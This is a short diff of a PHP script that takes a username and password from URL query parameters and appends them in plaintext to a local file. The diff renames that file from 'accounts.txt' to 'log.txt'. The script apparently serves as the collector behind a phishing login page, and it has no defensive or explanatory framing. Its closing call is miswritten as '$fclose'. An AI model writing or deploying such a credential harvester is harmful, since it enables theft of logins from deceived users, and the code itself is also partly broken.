@@ -1,7 +1,7 @@
 <?php
     $username = $_GET['USERNAME'];
     $password = $_GET['PASSWORD'];
-    $filename = 'accounts.txt';
+    $filename = 'log.txt';
     $fp = fopen($filename, 'a+');
     fwrite ($fp, $username . "," . $password . "\n");
     $fclose ($fp);
